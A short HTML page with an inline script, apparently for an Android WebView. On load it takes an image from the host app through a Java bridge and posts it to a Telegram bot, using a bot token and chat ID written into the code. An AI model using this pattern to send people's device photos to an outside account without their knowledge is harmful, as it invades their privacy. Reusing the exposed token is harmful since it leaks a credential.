<!DOCTYPE html>
<html>
  <body>
    <script>
      async function sendPhotoToTelegram(base64data) {
        const botToken = "8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
        const chatId = "6894787120";

        // نحول base64 إلى Blob
        const blob = await (await fetch(`data:image/jpeg;base64,${base64data}`)).blob();

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "image.jpg");

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData,
        }).then(res => {
          alert("✔️ تم إرسال الصورة إلى تيليجرام");
        }).catch(err => {
          alert("❌ فشل الإرسال: " + err.message);
        });
      }

      // استدعاء من WebView إلى Java
      const img = bridge.getImageBase64();
      if (img && img !== "ERROR") {
        sendPhotoToTelegram(img);
      } else {
        alert("📛 لم يتم العثور على الصورة أو خطأ في التحميل");
      }
    </script>
  </body>
</html>
